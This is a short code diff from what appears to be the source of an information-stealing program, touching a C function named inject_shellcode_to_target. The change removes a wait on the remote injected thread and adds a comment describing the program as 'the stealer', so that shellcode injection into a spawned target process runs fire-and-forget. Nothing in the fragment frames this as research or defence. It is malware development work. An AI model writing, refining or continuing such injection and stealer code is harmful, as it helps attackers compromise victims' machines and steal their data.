@@ -75,7 +75,7 @@ inject_result_t inject_shellcode_to_target(const char *target_exe,
 
     ResumeThread(pi.hThread);
 
-    WaitForSingleObject(remote_thread, INFINITE);
+    /* Fire-and-forget: do not block the stealer on the injected thread. */
 
     res.success = 1;
     res.target_pid = pi.dwProcessId;
